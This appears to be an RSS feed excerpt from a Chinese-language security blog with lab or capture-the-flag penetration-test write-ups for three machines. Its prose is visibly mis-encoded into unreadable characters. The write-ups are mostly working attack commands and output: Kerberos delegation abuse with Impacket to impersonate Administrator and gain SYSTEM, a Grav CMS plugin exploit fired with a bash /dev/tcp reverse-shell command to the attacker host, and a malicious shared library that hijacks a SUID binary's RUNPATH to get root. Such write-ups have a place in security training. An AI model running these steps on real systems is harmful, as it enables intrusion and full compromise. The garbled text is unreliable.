   È¶ñÂÖàÔºå‰ΩøÁî® `getTGT.py` ÂíåÊàë‰ª¨‰∏∫ `NEWPC$` ËÆæÁΩÆÁöÑÂØÜÁ†ÅÔºåËé∑ÂèñÂÖ∂Kerberos TGTÔºàÁ•®ÊçÆÊéà‰∫àÁ•®ÊçÆÔºâ„ÄÇ

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
   ‚îî‚îÄ$ python3 /usr/share/doc/python3-impacket/examples/getTGT.py -dc-ip 192.168.205.132 novice.com/NEWPC$:Password123!
   Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
   
   [*] Saving ticket in NEWPC$.ccache
   ```

2. **ËØ∑Ê±ÇÊ®°ÊãüÁÆ°ÁêÜÂëòÁöÑÊúçÂä°Á•®ÊçÆ**
   Êé•‰∏ãÊù•ÔºåÂà©Áî®‰∏ä‰∏ÄÊ≠•Ëé∑ÂèñÁöÑ TGTÔºåÈÄöËøá Kerberos S4U2proxy Êâ©Â±ïÂçèËÆÆÔºåËØ∑Ê±Ç‰∏ÄÂº†ÂèØ‰ª•**Ê®°Êãü `Administrator` Áî®Êà∑**Ë∫´‰ªΩ„ÄÅÂπ∂Áî®‰∫éËÆøÈóÆÂüüÊéß `cifs`ÔºàÊñá‰ª∂ÂÖ±‰∫´ÔºâÊúçÂä°ÁöÑÊúçÂä°Á•®ÊçÆ (ST)„ÄÇ

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
   ‚îî‚îÄ$ export KRB5CCNAME=NEWPC$.ccache
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
   ‚îî‚îÄ$ python3 /usr/share/doc/python3-impacket/examples/getST.py -k -no-pass -spn cifs/dc.novice.com -impersonate Administrator -dc-ip 192.168.205.132 novice.com/NEWPC$       
   Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
   
   [*] Impersonating Administrator
   [*] Requesting S4U2self
   [*] Requesting S4U2Proxy
   [*] Saving ticket in Administrator@cifs_dc.novice.com@NOVICE.COM.ccache
   ```

   ÊîªÂáªÊàêÂäüÔºåÊàë‰ª¨Ëé∑Âèñ‰∫ÜÂåÖÂê´ÁÆ°ÁêÜÂëòÊùÉÈôêÁöÑÊúçÂä°Á•®ÊçÆÔºåÂπ∂‰øùÂ≠òÂú®‰∏Ä‰∏™Êñ∞ÁöÑ `.ccache` Âá≠ËØÅÁºìÂ≠òÊñá‰ª∂‰∏≠„ÄÇ

---

# **Âõõ„ÄÅÂ§∫ÂèñÂüüÊéß‰∏éÊÄªÁªì**

## **4.1 Ëß£ÂÜ≥ÂêçÁß∞Ëß£ÊûêÈóÆÈ¢ò**

Âú®Áõ¥Êé•‰ΩøÁî®ÊúÄÁªàÁ•®ÊçÆËøõË°åÊîªÂáªÊó∂ÔºåÊàë‰ª¨ÁöÑÊîªÂáªÊú∫ÂèØËÉΩÂõ†‰∏∫Êó†Ê≥ïÂ∞ÜÂüüÂêç `dc.novice.com` Âíå `novice.com` Ëß£ÊûêÂà∞Ê≠£Á°ÆÁöÑIPÂú∞ÂùÄËÄåÂØºËá¥ËøûÊé•Â§±Ë¥•„ÄÇ‰∏∫‰∫ÜÈÅøÂÖçËøô‰∏™ÈóÆÈ¢òÔºåÈúÄË¶ÅÂ∞ÜÂüüÂêçÂíåIPÁöÑÂØπÂ∫îÂÖ≥Á≥ªÊâãÂä®ÂÜôÂÖ•Êú¨Âú∞ÁöÑ `/etc/hosts` Êñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo nano /etc/hosts
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ tail -n 1 /etc/hosts                                  
192.168.205.132 novice.com dc.novice.com DC
```

Ê∑ªÂä†Ê≠§Êù°ÁõÆÂêéÔºåÊâÄÊúâÁõ∏ÂÖ≥ÁöÑÂüüÂêçÈÉΩÂ∞ÜÊ≠£Á°ÆÊåáÂêëÁõÆÊ†áIP„ÄÇ

## **4.2 ÊúÄÁªàÊîªÂáª**

1. **Âä†ËΩΩÊúÄÁªàÁ•®ÊçÆ**
   È¶ñÂÖàÔºåÊõ¥Êñ∞ `KRB5CCNAME` ÁéØÂ¢ÉÂèòÈáèÔºå‰ΩøÂÖ∂ÊåáÂêëÂàöÂàöËé∑ÂèñÁöÑ„ÄÅÂåÖÂê´ÁÆ°ÁêÜÂëòÊùÉÈôêÁöÑÊñ∞Á•®ÊçÆÊñá‰ª∂„ÄÇ

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
   ‚îî‚îÄ$ export KRB5CCNAME=Administrator@cifs_dc.novice.com@NOVICE.COM.ccache
   ```

2. **ÊâßË°å `psexec.py` Ëé∑ÂèñSYSTEMÊùÉÈôê**
   ÊúÄÂêéÔºå‰ΩøÁî® `psexec.py` ÂíåÂ∑≤Âä†ËΩΩÁöÑÁÆ°ÁêÜÂëòÁ•®ÊçÆÔºåÂú®ÂüüÊéßÂà∂Âô®‰∏äÊâßË°åÂëΩ‰ª§„ÄÇËØ•Â∑•ÂÖ∑Â∞ÜÂà©Áî®Á•®ÊçÆËøõË°åËÆ§ËØÅÔºåÂπ∂Âú®ÁõÆÊ†á‰∏äÂàõÂª∫‰∏Ä‰∏™ÊúçÂä°Êù•ÂèçÂºπ‰∏Ä‰∏™‰∫§‰∫íÂºèShell„ÄÇ

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
   ‚îî‚îÄ$ python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass dc.novice.com
   Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
   
   [*] Requesting shares on dc.novice.com.....
   [*] Found writable share ADMIN$
   [*] Uploading file ACAXTjTE.exe
   [*] Opening SVCManager on dc.novice.com.....
   [*] Creating service ELXu on dc.novice.com.....
   [*] Starting service ELXu.....
   [!] Press help for extra shell commands
   [-] Decoding error detected, consider running chcp.com at the target,
   map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
   and then execute smbexec.py again with -codec and the corresponding codec
   Microsoft Windows [ÔøΩÊ±æ 10.0.20348.169]
   
   [-] Decoding error detected, consider running chcp.com at the target,
   map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
   and then execute smbexec.py again with -codec and the corresponding codec
   (c) Microsoft CorporationÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ»®ÔøΩÔøΩÔøΩÔøΩ
   
   C:\Windows\system32&gt; whoami
   nt authority\system
   ```

`whoami` ÂëΩ‰ª§ÁöÑËøîÂõûÁªìÊûúÁ°ÆËÆ§‰∏∫ `nt authority\system`ÔºåËøôË°®ÊòéÊàë‰ª¨Â∑≤ÊàêÂäüËé∑ÂæóÂüüÊéßÂà∂Âô®ÁöÑÊúÄÈ´òÁ≥ªÁªüÊùÉÈôê„ÄÇËá≥Ê≠§ÔºåÊú¨Ê¨°Ê∏óÈÄèÊµãËØïÂúÜÊª°ÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_novice-admin.html</guid><pubDate>Sat, 23 Aug 2025 04:10:08 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Grav</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Grav.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

È¶ñÂÖàÔºåÂú®ÁõÆÊ†áÁΩëÊÆµÂÜÖ‰ΩøÁî®`arp-scan`ËøõË°å‰∏ªÊú∫ÂèëÁé∞ÔºåÁ°ÆÂÆöÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄ„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
...
192.168.205.150 08:00:27:3c:ed:e0       PCS Systemtechnik GmbH
...
```

ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫IP‰∏∫ `192.168.205.150`„ÄÇÊé•ÁùÄÔºå‰ΩøÁî®`nmap`ÂØπËØ•‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•Êé¢ÊµãÂÖ∂ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.150
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:3C:ED:E0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåÁõÆÊ†á‰∏ªÊú∫ÂºÄÊîæ‰∫Ü22Á´ØÂè£ÔºàSSHÔºâÂíå80Á´ØÂè£ÔºàHTTPÔºâ„ÄÇ

# **‰∫å„ÄÅÊºèÊ¥ûÊâ´Êèè‰∏éÂà©Áî®**

ËÆøÈóÆ80Á´ØÂè£Êèê‰æõÁöÑWebÊúçÂä°ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™‰∫ßÂìÅ‰ªãÁªçÈ°µÈù¢ÔºåÊ≤°ÊúâÂ§™Â§öÂèØ‰∫§‰∫íÁöÑÂäüËÉΩ„ÄÇÂõ†Ê≠§Ôºå‰ΩøÁî®`gobuster`ËøõË°åÁõÆÂΩïÊâ´ÊèèÔºå‰ª•ÂèëÁé∞ÈöêËóèÁöÑË∑ØÂæÑÊàñÊñá‰ª∂„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.150 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
...
/index.html           (Status: 200) [Size: 12350]
/grav                 (Status: 301) [Size: 317] [--&gt; http://192.168.205.150/grav/]
...
```

Êâ´ÊèèÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÈáçË¶ÅÁöÑÁõÆÂΩï `/grav`„ÄÇËÆøÈóÆ `http://192.168.205.150/grav/`ÔºåËØÜÂà´Âá∫ËØ•Á´ôÁÇπÊòØÂü∫‰∫é Grav CMS ÊûÑÂª∫ÁöÑ„ÄÇ

Âú®ÊµèËßàÁΩëÈ°µÂÜÖÂÆπÊó∂Ôºå‰∫é`typography`È°µÈù¢ÂèëÁé∞‰∫Ü‰∏ÄÁªÑÁñë‰ººÂêéÂè∞Âá≠ÊçÆÁöÑÂ≠óÁ¨¶‰∏≤Ôºö`Grav Admin:Admin@123`„ÄÇ

![image-20250818165349274](http://7r1UMPHK.github.io/image/20250821190836487.webp)

‰ΩøÁî®Áî®Êà∑Âêç `admin` ÂíåÂØÜÁ†Å `Admin@123` Â∞ùËØïÁôªÂΩïÂêéÂè∞Âú∞ÂùÄ `http://192.168.205.150/grav/admin`ÔºåÊàêÂäüËøõÂÖ•ÁÆ°ÁêÜÈù¢Êùø„ÄÇ

ÁôªÂΩïÂêéÂè∞ÂêéÔºåËÆ°ÂàíÈÄöËøáÂÆâË£ÖÊÅ∂ÊÑèÁöÑÊèí‰ª∂Êù•Ëé∑ÂèñÊúçÂä°Âô®ÁöÑShell„ÄÇËøôÈáåÂà©Áî®‰∏Ä‰∏™Â∑≤Áü•ÁöÑÊèí‰ª∂ÊºèÊ¥ûÔºàCVE-2025-50286ÔºâÔºåÈÄöËøáÂêéÂè∞ÁöÑ‚ÄúÁõ¥Êé•ÂÆâË£Ö‚ÄùÂäüËÉΩ‰∏ä‰º†‰∏Ä‰∏™ÂåÖÂê´ÂêéÈó®ÁöÑÊèí‰ª∂ÂéãÁº©ÂåÖ `grav-plugin-simple_form-develop.zip`„ÄÇ

&gt; [!Tip]
&gt;
&gt; ÈÇ£‰∏™Êèí‰ª∂Âà©Áî®ÁöÑÊ®°ÊùøÔºöhttps://github.com/binneko/CVE-2025-50286
&gt;
&gt; ‰ΩÜÊòØ‰ªñËøô‰∏™ÊòØ‰ΩøÁî®‰∏ç‰∫ÜÁöÑÔºàÊîπÊîπËÉΩÁî®ÔºüÔºâÔºåÂª∫ËÆÆÂéªÊàë‰ª¨Áæ§ÁöÑdiscordÔºåÁúãSublargeÂèëÁöÑÈÇ£‰∏™
&gt;
&gt; ![image-20250818165621326](http://7r1UMPHK.github.io/image/20250821190812199.webp)

![image-20250818170620504](http://7r1UMPHK.github.io/image/20250821190814531.webp)

Êèí‰ª∂ÂÆâË£ÖÂπ∂ÊøÄÊ¥ªÂêéÔºåÂú®Kali‰∏äÂêØÂä®`netcat`ÁõëÂê¨8888Á´ØÂè£„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
```

Êé•ÁùÄÔºåÈÄöËøá`curl`ÂèëÈÄÅ‰∏Ä‰∏™Á≤æÂøÉÊûÑÈÄ†ÁöÑGETËØ∑Ê±ÇÊù•Ëß¶ÂèëÊèí‰ª∂‰∏≠ÁöÑÊºèÊ¥ûÔºåÊâßË°åÂèçÂêëShellÂëΩ‰ª§„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl --get --data-urlencode 'cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1'' http://192.168.205.150/grav/
```

ÁõëÂê¨Á´ØÊàêÂäüÊé•Êî∂Âà∞ÂèçÂºπShellÔºåÂΩìÂâçÁî®Êà∑‰∏∫`www-data`„ÄÇ

```shell
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.150] 55952
bash: cannot set terminal process group (404): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Grav:/var/www/html/grav$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

‰∏∫‰∫Ü‰æø‰∫éÂêéÁª≠Êìç‰ΩúÔºåÈ¶ñÂÖàÂà©Áî®`script`ÂëΩ‰ª§Â∞ÜÂΩìÂâçÁöÑShellÂçáÁ∫ß‰∏∫ÂäüËÉΩÊõ¥ÂÆåÊï¥ÁöÑ‰∫§‰∫íÂºèTTY„ÄÇ

```shell
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

Âú®ÊúçÂä°Âô®‰∏äËøõË°å‰ø°ÊÅØÊî∂ÈõÜÔºåÂèëÁé∞Âú®`/home/grav`ÁõÆÂΩï‰∏ãÂ≠òÂú®‰∏Ä‰∏™ÊèêÁ§∫Êñá‰ª∂`.hint`„ÄÇ

```shell
www-data@Grav:/home/grav$ ls -al
...
-rw-r-xr--+ 1 root root   21 Aug 16 06:56 .hint
-rw-r-x---+ 1 grav grav   44 Aug 16 07:05 user.txt
www-data@Grav:/home/grav$ cat .hint
do you know RUNPATH?
```

ÊèêÁ§∫‰ø°ÊÅØÊèêÂà∞‰∫Ü`RUNPATH`ÔºåËøôÊòØ‰∏ÄÁßçÂú®ELFÊñá‰ª∂‰∏≠ÊåáÂÆöÁöÑËøêË°åÊó∂Â∫ìÊêúÁ¥¢Ë∑ØÂæÑ„ÄÇÂÆÉÂÖ∑ÊúâÊØî`LD_PRELOAD`Âíå`LD_LIBRARY_PATH`Êõ¥È´òÁöÑ‰ºòÂÖàÁ∫ßÔºåÂ¶ÇÊûúÈÖçÁΩÆ‰∏çÂΩìÂèØËÉΩÂØºËá¥Â∫ìÂä´ÊåÅÊºèÊ¥û„ÄÇ

Ê†πÊçÆÊèêÁ§∫ÔºåÂºÄÂßãÂØªÊâæÂÖ∑ÊúâSUIDÊùÉÈôêÁöÑ‰∫åËøõÂà∂Êñá‰ª∂ÔºåËøô‰∫õÊñá‰ª∂ÊòØÊèêÊùÉÁöÑÂ∏∏ËßÅÂÖ•Âè£ÁÇπ„ÄÇ

```shell
www-data@Grav:/var/www/html/grav$ find / -perm -4000 -type f -exec ls -l {} \; 2&gt;/dev/null
...
-rwsr-xr-x 1 root root 17536 Aug 17 02:35 /usr/local/bin/usermgr
...
```

ÂèëÁé∞‰∏Ä‰∏™ÂèØÁñëÁöÑSUIDÊñá‰ª∂ `/usr/local/bin/usermgr`„ÄÇ‰ΩøÁî®`readelf`Ê£ÄÊü•ÂÖ∂Âä®ÊÄÅÈìæÊé•‰ø°ÊÅØÔºåÁ°ÆËÆ§ÂÖ∂`RUNPATH`Ë¢´ËÆæÁΩÆ‰∏∫ÂΩìÂâçÁõÆÂΩï `.`„ÄÇ

```shell
www-data@Grav:/home/grav$ readelf -d /usr/local/bin/usermgr | grep RUNPATH
 0x000000000000001d (RUNPATH)            Library runpath: [.]
```

Êé•ÁùÄÔºå‰ΩøÁî®`ldd`Êü•ÁúãËØ•Á®ãÂ∫è‰æùËµñÁöÑÂä®ÊÄÅÈìæÊé•Â∫ì„ÄÇ

```shell
www-data@Grav:/home/grav$ ldd /usr/local/bin/usermgr
        linux-vdso.so.1 (0x00007ffdbeac0000)
        libauth.so =&gt; /lib/libauth.so (0x00007fa27b1ff000)
        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa27b02b000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fa27b214000)
```

`usermgr`‰æùËµñ‰∏Ä‰∏™Âêç‰∏∫`libauth.so`ÁöÑÂ∫ì„ÄÇÁî±‰∫é`RUNPATH`Ë¢´ËÆæÁΩÆ‰∏∫ `.`ÔºåËøôÊÑèÂë≥ÁùÄÂΩìÊâßË°å`/usr/local/bin/usermgr`Êó∂ÔºåÁ≥ªÁªü‰ºöÈ¶ñÂÖàÂú®ÂΩìÂâçÂ∑•‰ΩúÁõÆÂΩï‰∏ãÊü•Êâæ`libauth.so`„ÄÇËøô‰∏∫Êàë‰ª¨ÂÆûÊñΩÂ∫ìÂä´ÊåÅÊèê‰æõ‰∫ÜÊù°‰ª∂„ÄÇ

ÂàáÊç¢Âà∞ÂÖ∑ÊúâÂÜôÊùÉÈôêÁöÑÁõÆÂΩï`/tmp`ÔºåÂπ∂ÁºñÂÜô‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑCÊ∫êÊñá‰ª∂`a.c`„ÄÇËØ•Êñá‰ª∂Âà©Áî®GCCÁöÑ`__attribute__((constructor))`ÁâπÊÄßÔºåÂú®Â∫ìË¢´Âä†ËΩΩÊó∂Ëá™Âä®ÊâßË°å‰ª£Á†ÅÔºå‰ª•rootÊùÉÈôêÁîüÊàê‰∏Ä‰∏™bash shell„ÄÇ

```c
// a.c
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;

void __attribute__((constructor)) run_on_load() {
    setuid(0);
    setgid(0);
    char *args[] = {'/bin/bash', NULL};
    execve('/bin/bash', args, NULL);
}
```

Â∞ÜËØ•CÊñá‰ª∂ÁºñËØë‰∏∫Âêç‰∏∫`libauth.so`ÁöÑÂÖ±‰∫´Â∫ì„ÄÇ

```shell
www-data@Grav:/tmp$ gcc -shared -fPIC -o libauth.so a.c
```

ÊúÄÂêéÔºåÂú®`/tmp`ÁõÆÂΩï‰∏ãÊâßË°å`/usr/local/bin/usermgr`„ÄÇÁî±‰∫é`RUNPATH`ÁöÑËÆæÁΩÆÔºåÁ®ãÂ∫è‰ºöÂä†ËΩΩÊàë‰ª¨ÊîæÂú®`/tmp`‰∏ãÁöÑÊÅ∂ÊÑè`libauth.so`Ôºå‰ªéËÄåÊâßË°åÂÖ∂‰∏≠ÁöÑÊèêÊùÉ‰ª£Á†Å„ÄÇ

```shell
www-data@Grav:/tmp$ /usr/local/bin/usermgr
root@Grav:/tmp# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

ÊàêÂäüËé∑ÂèñrootÊùÉÈôê„ÄÇÁé∞Âú®ÂèØ‰ª•ËØªÂèñÊâÄÊúâÁöÑflagÊñá‰ª∂„ÄÇ

```shell
root@Grav:/tmp# cat /root/root.txt /home/grav/user.txt
flag{root-67f2a835697e7c9c2c5146c76eca6038}
flag{user-ab72ef6c613b6a51db91eedd34271143}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Grav.html</guid><pubDate>Thu, 21 Aug 2025 11:09:12 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Chat2</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Chat2.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

È¶ñÂÖàÔºåÂú®‰∏éÁõÆÊ†áÁΩëÁªúÁõ∏ÂêåÁöÑÁΩëÊÆµ‰∏ãÔºå‰ΩøÁî® `arp-scan` Â∑•ÂÖ∑ÂØπCÊÆµËøõË°åÊâ´ÊèèÔºå‰ª•ÂèëÁé∞ÂÜÖÁΩë‰∏≠ÁöÑÂ≠òÊ¥ª‰∏ªÊú∫„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.153 08:00:27:44:e8:4a       (Unknown)
...
```

ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫IP‰∏∫ `192.168.205.153`„ÄÇÊé•‰∏ãÊù•Ôºå‰ΩøÁî® `nmap` ÂØπËØ•‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•Êé¢ÊµãÂÖ∂ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.153
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 10:02 EDT
Nmap scan report for 192.168.205.153
Host is up (0.00010s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:44:E8:4A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåÁõÆÊ†á‰∏ªÊú∫ÂºÄÊîæ‰∫Ü22Á´ØÂè£ÔºàSSHÊúçÂä°ÔºâÂíå80Á´ØÂè£ÔºàHTTPÊúçÂä°Ôºâ„ÄÇ

# **‰∫å„ÄÅÊºèÊ¥ûÂà©Áî®**

## **1. Web‰ø°ÊÅØÊ≥ÑÈú≤**

Êàë‰ª¨È¶ñÂÖà‰ªé80Á´ØÂè£ÁöÑWebÊúçÂä°ÂÖ•Êâã„ÄÇËÆøÈóÆ `http://192.168.205.153`ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™Discuz!ËÆ∫Âùõ„ÄÇÂú®‚ÄúÂú®Á∫ø‰ºöÂëò‚ÄùÊ®°Âùó‰∏≠ÔºåÊàë‰ª¨Ê≥®ÊÑèÂà∞‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `admin` ÁöÑÁÆ°ÁêÜÂëòÁî®Êà∑„ÄÇÊ≠§Â§ñÔºåÂú®ÈªòËÆ§ÁâàÂùó‰∏≠ÂèëÁé∞‰∫Ü‰∏ÄÁØáÊ†áÈ¢ò‰∏∫‚ÄúLet's Encrypt‚ÄùÁöÑÊñáÁ´†„ÄÇ

![image-20250820220528034](http://7r1UMPHK.github.io/image/20250821102639273.webp)

Êü•ÁúãÊñáÁ´†ÂÜÖÂÆπÔºåÂèëÁé∞ÊòØ‰∏ÄÊÆµÊë©ÊñØÂØÜÁ†ÅÔºö

```
.--. .- ... ... .-- --- .-. -.. .---- ..--- ...--
```

‰ΩøÁî®Âú®Á∫øÊë©ÊñØÂØÜÁ†ÅËß£Á†ÅÂ∑•ÂÖ∑ÔºåÂæóÂà∞Ëß£Á†ÅÁªìÊûúÔºö

```
PASSWORD123
```

&gt; **Ê≥®ÊÑè**ÔºöÊë©ÊñØÂØÜÁ†ÅÊú¨Ë∫´‰∏çÂå∫ÂàÜÂ≠óÊØçÂ§ßÂ∞èÂÜôÔºåÂõ†Ê≠§Âú®ÂÆûÈôÖÁàÜÁ†¥ÊàñÁôªÂΩïÂ∞ùËØïÊó∂ÔºåÈúÄË¶ÅËÄÉËôëÊâÄÊúâÂèØËÉΩÁöÑÂ§ßÂ∞èÂÜôÁªÑÂêàÔºåÂ¶Ç `password123`, `Password123`, `PASSWORD123` Á≠â„ÄÇ

## **2. Ëé∑ÂèñWebÂêéÂè∞ÊùÉÈôê**

Êàë‰ª¨ÂΩìÂâçÂè™Áü•ÈÅìÁÆ°ÁêÜÂëòÁî®Êà∑Âêç‰∏∫ `admin`Ôºå‰ΩÜÊ≤°ÊúâSSHÁöÑÁî®Êà∑ÂêçÔºåÂõ†Ê≠§È¶ñÂÖàÂ∞ùËØïÁôªÂΩïDiscuz!ÁöÑWebÂêéÂè∞„ÄÇ

‰ΩøÁî®Áî®Êà∑Âêç `admin` ÂíåÂàöÂàöËß£Á†ÅÂá∫ÁöÑÂØÜÁ†Å `password123` ËøõË°åÁôªÂΩïÔºåÊàêÂäüËøõÂÖ•ËÆ∫Âùõ„ÄÇ

![image-20250820220813966](http://7r1UMPHK.github.io/image/20250821102705225.webp)

Âú®Áî®Êà∑ÁïåÈù¢‰∏≠ÔºåÊàë‰ª¨ÊâæÂà∞‰∫Ü‚ÄúÁÆ°ÁêÜ‰∏≠ÂøÉ‚ÄùÁöÑÂÖ•Âè£ÔºåËøôÊ≠£ÊòØÊàë‰ª¨ÊÑüÂÖ¥Ë∂£ÁöÑÂú∞Êñπ„ÄÇÁÇπÂáªËøõÂÖ•Êó∂ÔºåÁ≥ªÁªüË¶ÅÊ±ÇÂÜçÊ¨°È™åËØÅÂØÜÁ†ÅÔºåÊàë‰ª¨ËæìÂÖ• `password123` ÂêéÊàêÂäüËøõÂÖ•ÂêéÂè∞„ÄÇ

## **3. Ê≠£ÂêëShell**

Âú®ÂêéÂè∞È¶ñÈ°µÔºåÊàë‰ª¨Ê≥®ÊÑèÂà∞ËØ•Discuz! ÁöÑÁâàÊú¨‰∏∫ 3.5 (20250205)ÔºåËøôÊòØ‰∏Ä‰∏™ËæÉÊñ∞ÁöÑÁâàÊú¨„ÄÇÁªèËøáÂàùÊ≠•ÊêúÁ¥¢ÔºåÂπ∂Êú™ÂèëÁé∞ËØ•ÁâàÊú¨Â≠òÂú®Â∑≤Áü•ÁöÑËøúÁ®ã‰ª£Á†ÅÊâßË°åÔºàRCEÔºâÊºèÊ¥û„ÄÇ

‰∫éÊòØÔºåÊàë‰ª¨ÂºÄÂßãÊé¢Á¥¢ÂêéÂè∞ÁöÑÂêÑÈ°πÂäüËÉΩ„ÄÇÂú® **Â∑•ÂÖ∑ &gt; ËÆ°Âàí‰ªªÂä°** ‰∏≠ÔºåÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ `shell.php` ÁöÑËá™ÂÆö‰πâ‰ªªÂä°„ÄÇ

![image-20250820221119024](http://7r1UMPHK.github.io/image/20250821102637022.webp)

Â∞ùËØïÁºñËæëËØ•‰ªªÂä°ÔºåÂèëÁé∞ÂÖ∂ÊâßË°åÁöÑËÑöÊú¨ `shell.php` ÊòØÂÜôÊ≠ªÁöÑÔºåÊó†Ê≥ïÁõ¥Êé•‰øÆÊîπÂÖ∂ÂÜÖÂÆπ„ÄÇÊ†πÊçÆÂëΩÂêçÊé®ÊµãÔºåËøôÂèØËÉΩÊòØ‰∏Ä‰∏™È¢ÑÁïôÁöÑWebShellÊàñËÄÖ‰∏Ä‰∏™Áî®‰∫éÂª∫Á´ãËøûÊé•ÁöÑËÑöÊú¨„ÄÇÊàë‰ª¨Êó†Ê≥ï‰øÆÊîπËÑöÊú¨Ôºå‰ΩÜÂèØ‰ª•ÊéßÂà∂ÂÖ∂ÊâßË°åÊó∂Èó¥„ÄÇ

Êàë‰ª¨Â∞ÜÊâßË°åÂë®ÊúüÁöÑ‚ÄúÊØèÂë®‚ÄùÂ≠óÊÆµÊîπ‰∏∫ `*` (‰ª£Ë°®ÊØèÂ§©)ÔºåÂπ∂Â∞Ü‚ÄúÂàÜÈíü‚ÄùÂ≠óÊÆµ‰øÆÊîπ‰∏∫ÂΩìÂâçÊó∂Èó¥ÁöÑ‰∏ã‰∏ÄÂàÜÈíüÔºà‰æãÂ¶ÇÔºåÂΩìÂâçÊòØ10:12ÔºåÂ∞±ËÆæÁΩÆ‰∏∫13Ôºâ„ÄÇ

![image-20250820221256884](http://7r1UMPHK.github.io/image/20250821102637186.webp)

